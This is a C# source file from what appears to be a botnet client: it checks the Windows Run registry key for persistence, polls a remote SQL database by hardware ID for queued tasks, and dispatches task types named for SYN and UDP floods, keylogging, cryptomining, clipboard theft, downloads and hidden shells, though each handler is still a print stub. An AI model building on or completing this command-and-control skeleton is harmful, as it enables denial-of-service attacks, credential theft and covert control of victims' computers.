using System.Reflection;
using System.Data.SqlClient;
using System;

namespace Bot.Classes
{
    internal class Misc
    {
        public static string getFileLocation()
        {
            string loc = Assembly.GetExecutingAssembly().Location;
            if (loc == "" || loc == null)
            {
                loc = Assembly.GetEntryAssembly().Location;
            }
            return loc;
        }

        public static bool getKey(string key)
        {
            bool exists = false;
            Microsoft.Win32.RegistryKey reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", false);
            foreach (string r in reg.GetValueNames())
            {
                if (r == key)
                    exists = true;
            }
            return exists;
        }

        public static DateTime getDate()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                DateTime date = new DateTime();
                try
                {
                    using (SqlCommand cmd = new SqlCommand("SELECT CONVERT(datetime,GETDATE())", conn))
                    {
                        date = Convert.ToDateTime(cmd.ExecuteScalar());
                    }
                }
                catch { }
                return date;
            }
        }

        public static void Task(string type)
        {
            switch (type)
            {
                case "clipboard":
                    Console.WriteLine("Clipboard");
                    break;
                case "http":
                    Console.WriteLine("HTTP");
                    break;
                case "syn":
                    Console.WriteLine("SYN");
                    break;
                case "udp":
                    Console.WriteLine("UDP");
                    break;
                case "download":
                    Console.WriteLine("Download");
                    break;
                case "firefox":
                    Console.WriteLine("Firefox");
                    break;
                case "homepage":
                    Console.WriteLine("homepage");
                    break;
                case "keylogger":
                    Console.WriteLine("keylogger");
                    break;
                case "mine":
                    Console.WriteLine("mine");
                    break;
                case "cleanse":
                    Console.WriteLine("cleanse");
                    break;
                case "update":
                    Console.WriteLine("update");
                    break;
                case "uninstall":
                    Console.WriteLine("uninstall");
                    break;
                case "viewhidden":
                    Console.WriteLine("viewhidden");
                    break;
                case "viewvisable":
                    Console.WriteLine("viewvisable");
                    break;
                case "shellhidden":
                    Console.WriteLine("shellhidden");
                    break;
                case "shellvisable":
                    Console.WriteLine("shellvisable");
                    break;
                default:
                    Console.WriteLine("what");
                    break;
            }
        }
        
        public static int[] getTaskID()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                int[] TaskID = new int[getTaskAmount() + 1];
                for (int i = 0; i < getTaskAmount(); i++)
                {
                    using (SqlCommand cmd = new SqlCommand("SELECT DISTINCT TaskID FROM (SELECT TaskID, DENSE_RANK() OVER (order by TaskID) AS rownum FROM Tasks WHERE HWID = @HWID GROUP BY TaskID ) AS tbl WHERE tbl.rownum = @i;", conn))
                    {
                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                        cmd.Parameters.AddWithValue("i", i + 1);
                        TaskID[i] = (int)cmd.ExecuteScalar();
                        cmd.Parameters.Clear();
                    }
                }
                return TaskID;
            }
        }

        public static int getTaskAmount()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                int TaskAmount = 0;
                using (SqlCommand cmd = new SqlCommand("SELECT TaskAmount FROM bots where HWID = @HWID", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                    TaskAmount = (int)cmd.ExecuteScalar();
                }
                return TaskAmount;
            }
        }

        public static string getTask(int i)
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                string Type = "";
                using (SqlCommand cmd = new SqlCommand("SELECT Type from Tasks where HWID = @HWID AND TaskID = @TaskID;", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                    cmd.Parameters.AddWithValue("TaskID", getTaskID()[i]);
                    Type = cmd.ExecuteScalar().ToString();
                }
                return Type;
            }
        }

        public static bool Registered()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE HWID = @HWID ", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                    if((int)cmd.ExecuteScalar() > 0)
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }
        }
    }
}